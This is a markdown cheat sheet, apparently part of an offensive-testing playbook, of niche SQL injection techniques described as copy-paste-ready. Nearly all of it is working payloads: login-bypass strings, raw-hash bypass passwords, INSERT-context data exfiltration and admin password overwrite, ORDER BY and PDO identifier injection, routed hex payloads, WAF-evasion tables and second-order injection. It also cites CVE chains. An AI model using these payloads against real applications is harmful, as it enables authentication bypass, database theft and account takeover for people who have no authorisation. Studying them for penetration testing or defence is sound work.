# Niche SQLi techniques — Open WHEN: a confirmed injection point sits in a login/INSERT/identifier/ORDER BY context, is behind a character-stripping WAF, or stored input re-enters a later query

The body covers the standard channels, DBMS primitives, and general WAF-bypass categories.
This file is the long-tail: concrete auth-bypass strings, INSERT/identifier/PDO contexts,
character-restriction bypass tables, and dated CVE chains. Each section is copy-paste-ready.

## 1. Authentication bypass strings

Send in the username field; password can be anything. `LIMIT 1` avoids "more than one row".

```sql
' OR '1'='1'--
' or 1=1 limit 1 --
admin'--
admin' #
admin'/*
' UNION SELECT 1,'admin','admin'-- -
```

Resulting query shape: `... WHERE username = '' OR '1'='1'--' AND password = ''`.
Caution: a bare `OR 1=1` on a non-SELECT endpoint can wipe sessions/rows — prefer `LIMIT 1`.

## 2. Raw MD5/SHA1 hash bypass (`md5($pass,true)` in the query)

Vulnerable sink: `"SELECT * FROM admin WHERE pass='".md5($password,true)."'"`.
Submit these raw passwords; the raw-binary digest contains `'or'...` and escapes the literal:

```
md5  ffifdyop                                  -> raw contains  'or'6...   (payload 'or')
md5  129581926211651571912466741651878684928  -> raw contains  'or'8...   (payload 'or')
sha1 3fDf                                      -> raw contains  '='...     (payload '=')
sha1 178374                                    -> raw contains  '/*...     (payload '/*)
```

## 3. Injected-hash bypass (UNION a known hash into the result row)

App computes `hash(input)` and compares to the row it received. Inject a row whose hash you
know, then log in with that cleartext:

```sql
admin' AND 1=0 UNION ALL SELECT 'admin','161ebd7d45089b3446ee4e0d86dbcf92'--
-- 161ebd7d45089b3446ee4e0d86dbcf92 = MD5("P@ssw0rd") ; then log in with P@ssw0rd
admin' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'--   (MD5 of 1234)
```

Fails against per-user salted KDFs — the static hash cannot match a salted compare.

## 4. GBK / multibyte quote-escape bypass

When the app escapes `'` to `\'` but the connection is GBK, `%bf%27` becomes a valid
multibyte char + an unescaped quote:

```
%bf' OR 1=1 -- -
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
```

## 5. Polyglot (fires across several contexts unchanged)

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## 6. INSERT-statement contexts (registration / profile / signup)

Time-based confirm inside a VALUES list (add `','',''` to escape the tuple):

```
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```

Extract data into a second inserted row (read FLAG without any output channel):

```sql
username=TEST&password=TEST&email=TEST'),('u2','p2',(select flag from flag limit 1))-- -
-- a new row u2/p2 is created with email = the flag value; read it back via the UI
```

Overwrite an existing admin password via duplicate-key:

```sql
INSERT INTO users (email,password) VALUES ("x@x.com","HASH"),("admin@x.com","HASH") ON DUPLICATE KEY UPDATE password="HASH"-- ";
```

Single-row hex exfil (no comment needed, value reflected in app output):

```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
-- decode in python: __import__('binascii').unhexlify(hex(215573607263)[2:])
```

SQL truncation (length-limited username field, older MySQL only): create user
`admin[30 spaces]a` + any password; trailing spaces are trimmed and you own `admin`.

## 7. Identifier / ORDER BY injection (bound params don't help)

Prepared statements bind VALUES, never identifiers. If `sort`/`col`/table name is
concatenated (even inside backticks), it is injectable.

```php
// vulnerable: "SELECT id,name FROM items WHERE uid=? ORDER BY `$sort`"
```

Signals: a `sort=column` POST param with no allow-list; changing it reorders or errors.
Subquery into the SELECT/identifier position exfiltrates arbitrary scalars:

```sql
SELECT (SELECT token FROM userauthtoken WHERE userid=1) FROM users WHERE id=1;
```

AST / `JSON_VALUE` filter-to-SQL converters that wrap values as `'%s'` unescaped:

```
payload (urlenc): %27%20OR%20%271%27%3D%271   ->   ' OR '1'='1
JSON_VALUE(metadata,'$.department') = '' OR '1'='1'
```

## 8. PDO prepared-statement injection (novel, 2025 — PHP ≤ 8.3)

When user input lands inside the prepared SQL string (`$pdo->prepare("SELECT $col FROM ...")`)
AND another param is bound. MySQL is vulnerable by default; Postgres only with
`ATTR_EMULATE_PREPARES=true`; SQLite not affected. You only need to smuggle a `:` or `?`.

```
# detect — col = ?#\0 , name = anything
GET /index.php?col=%3f%23%00&name=anything
# -> error: ... near '`'anything'#' at line 1

# extract — split column with a backtick, build a subselect, terminate with ;#
GET /index2.php?col=\%3f%23%00&name=x%60+FROM+(SELECT+table_name+AS+`'x`+from+information_schema.tables)y%3b%2523
```

## 9. Routed SQLi (hex first query feeds the output query)

Inner injection is hex-encoded; its result becomes the next query:

```sql
-- hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
-- hex of: ' union select 1,2#
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

## 10. No-space WAF bypass

```
?id=1%09and%091=1%09--      %09 tab
?id=1%0Aand%0A1=1%0A--      %0A newline
?id=1%0Band%0B1=1%0B--      %0B vertical tab
?id=1%0Cand%0C1=1%0C--      %0C form feed
?id=1%0Dand%0D1=1%0D--      %0D carriage return
?id=1%A0and%A01=1%A0--      %A0 non-breaking space
?id=1/*comment*/and/**/1=1/**/--
?id=(1)and(1)=(1)--
?id=1/*!12345UNION*//*!12345SELECT*/1--
```

Whitespace bytes accepted per DBMS: SQLite/PostgreSQL `0A 0D 0C 09 20`; MySQL5
`09 0A 0B 0C 0D A0 20`; Oracle11g adds `00`; MSSQL `01–1F 20`.

## 11. No-comma bypass

```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

## 12. No-equal / no-keyword operator swaps

```
=     -> SUBSTRING(VERSION(),1,1)LIKE(5)   |  IN(4,3)  |  BETWEEN 3 AND 4  |  REGEXP
>     -> NOT BETWEEN 0 AND X
AND   -> &&        OR -> ||        WHERE -> HAVING
```

## 13. Scientific-notation WAF bypass (MySQL, AWS WAF 2021)

```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```

## 14. Column/table-name restriction bypass (extract without knowing names)

```sql
-- if both queries have equal column count
0 UNION SELECT * FROM flag
-- access 3rd column positionally via derived table
-1 UNION SELECT 0,0,0,F.3 FROM (SELECT 1,2,3 UNION SELECT * FROM demo)F;
```

## 15. Second-order SQLi

Store a payload that is inert at write time, fires when a later query re-reads it unsafely:

```
register username = attacker'--      (stored verbatim via a bound INSERT)
later:  "SELECT * FROM logs WHERE username = '" + user_from_db + "'"   -> triggers
```

## 16. Dated CVE / writeup chains to mirror

```
CVE-2026-22730   SQL injection in Spring AI + MariaDB
CVE-2018-6376    Joomla! second-order SQLi
vTenext 25-02    three-way path to RCE via SELECT-list/identifier SQLi (sicuranext)
HTB Gavel        ORDER BY / identifier SQLi -> token exfil (0xdf 2026-03)
```
